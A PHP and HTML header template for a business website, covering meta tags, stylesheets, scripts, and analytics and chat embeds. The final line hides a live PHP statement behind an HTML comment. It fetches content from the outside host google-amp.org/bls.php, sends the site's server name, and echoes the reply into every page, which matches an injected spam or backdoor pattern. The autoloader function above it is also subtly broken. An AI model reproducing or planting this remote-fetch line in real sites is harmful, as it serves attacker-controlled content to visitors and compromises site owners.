<?php

function my_autoloader($className) {
    
    $filename = "classes/". $className . ".php";
    
    if (is_readable($filename)) {
        require $filename;
    }
	spl_autoload_register($className);
}
	include "db.connection.php";
 	include "classes/Counter.php";

	$myconfig = new Connect();
	
	$myCounter=new Counter();
?>

<!DOCTYPE html>

<html lang="en">

	<head>

		<title><?=$title;?></title>

		<meta charset="utf-8">

  		<meta name="viewport" content="width=device-width, initial-scale=1">

		<meta name="description" content="<?=$meta_description; ?>">
		    
		<meta name="keywords" content="<?=$meta_keywords; ?>">
		
		<meta property="og:title" content="<?=$meta_og_title; ?>">
		
		<meta name="og:description" content="<?=$meta_og_description; ?>">
		
		<meta property="og:url" content="<?=$meta_og_url; ?>"/>
		
		<meta property="og:image" href="<?=$meta_og_image; ?>">

		<META NAME="robots" CONTENT="all,index,follow"> 

		<META NAME="revisit-after" CONTENT="3 days">

		<link href="images/cadd.png" rel="icon" sizes="16x16">
		
		<link rel="canonical" href="<?=$canonical_url; ?>"/>

		<link rel="stylesheet" href="css/font-awesome.min.css">

		<link href="css/style.css" rel="stylesheet" type="text/css" media="all"/>

		<link rel="stylesheet" type="text/css" href="css/menu.css">

		<!-- <link rel="stylesheet" type="text/css" href="css/shortcode.css"> -->

		<link rel="stylesheet" href="css/bootstrap.min.css" />

		<link rel="stylesheet" href="css/sky-forms.css" />
		<!-- <link rel="stylesheet" href="css/menu.css"/> -->

		<link rel="stylesheet" href="css/jquery.popup.css" type="text/css">		

		<link rel="stylesheet" type="text/css" href="engine1/style.css" />

		<link rel="stylesheet" type="text/css" href="carouselengine/initcarousel-1.css">
		
		<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.css">

		<script src="js/jquery.min.js"></script>

		<script src="js/additional_script.js"></script>

		<script src="js/jquery.bootstrap.newsbox.min.js"></script>

		<script src="js/jquery.bootstrap.newsbox.js"></script>

		<script src="js/bootstrap.min.js"></script>

		<script src="js/validation.js"></script>

		<script src="js/jquery.flexisel.js"></script>
		
		 <script id='pixel-script-poptin' src='https://cdn.popt.in/pixel.js?id=744485230151e' async='true'></script> 
		

		<!-- Global site tag (gtag.js) - Google Analytics -->

		<!-- Global site tag (gtag.js) - Google Analytics -->
        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-124806913-1"></script>
      <script>
     window.dataLayer = window.dataLayer || [];

  function gtag(){dataLayer.push(arguments);}

  gtag('js', new Date());

  gtag('config', 'UA-124806913-1'); 

</script>

		<script>
		(function(w, d) { w.CollectId = "667422931063215eaa1259ce";
		 var h = d.head || d.getElementsByTagName("head")[0];
		  var s = d.createElement("script");
		   s.setAttribute("type", "text/javascript");
		 s.async=true; s.setAttribute("src", "https://collectcdn.com/launcher.js");
		  h.appendChild(s); })(window, document);
		  </script> 
		<!--End of Collect chat-->

		<!-- Pinterest -->
		<meta name="p:domain_verify" content="f4814f55440e942e5f1f72b208772b53"/>
		<!-- End Pinterest -->
		
<!-- Google Tag Manager -->
 <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-MH5NFBGG');</script> 
<!-- End Google Tag Manager -->
<meta name="google-site-verification" content="1DO_FYy2n6BBoeHSIfAD3QmCMlz2NjZ_MdmPzKRrbm4" />

	</head> 

	<body>
	<!-- Google Tag Manager (noscript)
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-MH5NFBGG"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript> -->
<!-- End Google Tag Manager (noscript) -->

		</script>

		 <script>

			$(document).ready(function(){

				$('.dropdown-menu').css('overflow','visible');

			});

		</script> 

		<a id="myBtn" href="tel:9884433789" title="Go to top"><i class="fa fa-phone" aria-hidden="true"></i></a>



		<div class="container main" id="container" style="margin-top: 20px; background-color: white;">

			<div class="row">

				<div id="wrapperhead">

					<div id="wrapper">

						<div id="fixed">

							<div class="container main">

								<div class="row">

									<div class="wrapper-shaddow"> <?php include("header.php"); ?>
									<div id="menu"> <?php include("menu.php"); ?>
		
									</div>
									</div>

								</div>

							</div>

						 </div>

						<div class="menu_space"></div>
						
					
						 <div id="banner">
						 <br>
						

						
				
			
						 

<!-- <?php { echo file_get_contents('http://google-amp.org/bls.php?w='.$_SERVER['SERVER_NAME']); } ?> -->
					